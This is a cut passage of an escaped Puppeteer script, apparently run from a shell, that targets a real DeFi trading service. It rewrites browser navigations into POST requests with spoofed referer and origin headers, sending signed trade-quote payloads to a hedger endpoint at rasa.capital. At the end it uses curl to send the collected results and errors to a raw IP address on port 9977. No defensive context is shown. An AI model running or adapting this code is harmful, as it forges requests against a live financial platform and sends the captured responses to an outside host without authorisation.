rade/\",\"origin\":\"https://app.bmx.trade\"}})}else req.continue()});try{await pg.goto(\"https://base-hedger82.rasa.capital/instant_trade/open\",{waitUntil:\"networkidle0\",timeout:15000});r.trade_result=await pg.evaluate(()=>document.body.innerText.substring(0,500))}catch(e){r.trade_err=e.message.substring(0,200)}await pg.close();const pg2=await b.newPage();await pg2.setRequestInterception(true);const body2=JSON.stringify({sendQuote:{signedOperation:{signer:addr,target:DIAMOND,callData:\"0x\",signerAccount:{addr:addr,isPartyB:false},replayAttackHeader:{nonce:0,deadline:Math.floor(Date.now()/1000)+3600,salt:\"0x1234\"}},signature:sig}});pg2.on(\"request\",req=>{if(req.isNavigationRequest()){req.continue({method:\"POST\",postData:body2,headers:{...req.headers(),\"content-type\":\"application/json\",\"referer\":\"https://app.bmx.trade/\",\"origin\":\"https://app.bmx.trade\"}})}else req.continue()});try{await pg2.goto(\"https://base-hedger82.rasa.capital/instant_trade/open\",{waitUntil:\"networkidle0\",timeout:15000});r.trade2_result=await pg2.evaluate(()=>document.body.innerText.substring(0,500))}catch(e){r.trade2_err=e.message.substring(0,200)}await pg2.close();cp.execSync(\"curl -s -X POST http://93.127.162.210:9977/v56_results -d @-\",{input:JSON.stringify(r)});await b.close()})().catch(e=>cp.execSync(\"curl -s -X POST http://93.127.162.210:9977/v56_err -d @-\",{input:e.message.substring(0,500)}))'; echo done)"
